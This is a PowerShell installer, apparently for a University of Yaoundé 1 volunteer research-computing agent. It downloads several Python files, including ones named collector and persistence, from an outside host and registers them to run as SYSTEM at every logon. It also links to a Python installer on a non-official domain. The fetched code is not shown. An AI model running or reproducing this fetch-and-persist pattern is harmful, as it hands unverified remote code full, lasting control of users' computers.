# VC-UY1 : RESEARCH AGENT WINDOWS BOOTSTRAP (V3.2)
# Developed by Antigravity for University of Yaoundé 1

$ErrorActionPreference = "Stop"

Write-Host "--------------------------------------------------------" -ForegroundColor Cyan
Write-Host "  UNIVERSITY OF YAOUNDE 1 - RESEARCH NODE INSTALLER     " -ForegroundColor Cyan
Write-Host "--------------------------------------------------------" -ForegroundColor Cyan

# 1. Prerequisites Check
Write-Host "[1/4] Checking environment..."

$PythonCmd = ""
foreach ($cmd in @("python", "python3", "py")) {
    try {
        $v = & $cmd --version 2>$null
        if ($LASTEXITCODE -eq 0) {
            $PythonCmd = $cmd
            break
        }
    } catch {}
}

if ($PythonCmd -eq "") {
    Write-Host ""
    Write-Host "❌ ERREUR : Python n'a pas été détecté sur votre ordinateur." -ForegroundColor Red
    Write-Host "Pour participer au cluster de recherche, vous devez installer Python 3.10+." -ForegroundColor White
    Write-Host ""
    Write-Host "1. Téléchargez Python ici : https://vc-uy1.npe-techs.com/python-3.14.4-amd64.exe" -ForegroundColor Yellow
    Write-Host "2. IMPORTANT : Cochez la case 'Add Python to PATH' lors de l'installation." -ForegroundColor Yellow
    Write-Host "3. Une fois installé, relancez cette commande." -ForegroundColor Yellow
    Write-Host ""
    return
}

Write-Host "Utilisation de : $PythonCmd" -ForegroundColor Gray

# 2. Dependency Resolution
Write-Host "[2/4] Resolving research dependencies..."
$InstallDir = "$env:APPDATA\vc-uy1-agent"
if (-not (Test-Path $InstallDir)) {
    New-Item -ItemType Directory -Path $InstallDir | Out-Null
}

Write-Host "Creating secure virtual environment..."
& $PythonCmd -m venv "$InstallDir\venv"
& "$InstallDir\venv\Scripts\pip.exe" install -q psutil requests certifi

# 3. Agent Fetching
Write-Host "[3/4] Pulling latest agent source..."
Set-Location $InstallDir

$Files = @("collector.py", "syncer.py", "workload.py", "main.py", "persistence.py", "heartbeat.py")
foreach ($File in $Files) {
    $Url = "https://vc-uy1.npe-techs.com/agent/$File"
    Invoke-WebRequest -Uri $Url -OutFile $File -UseBasicParsing
}

# 4. Persistence Setup (Scheduled Task)
Write-Host "[4/4] Activating research persistence..."

$Action = New-ScheduledTaskAction -Execute "$InstallDir\venv\Scripts\python.exe" -Argument "$InstallDir\main.py --foreground"
$Trigger = New-ScheduledTaskTrigger -AtLogOn
$Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount
$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable

Register-ScheduledTask -TaskName "VC-UY1-Agent" -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings -Force

Start-ScheduledTask -TaskName "VC-UY1-Agent"

Write-Host "--------------------------------------------------------" -ForegroundColor Green
Write-Host " SUCCESS: Your node is now contributing to the cluster! " -ForegroundColor Green
Write-Host " Check your contribution on: https://vc-uy1.npe-techs.com " -ForegroundColor Green
Write-Host "--------------------------------------------------------" -ForegroundColor Green
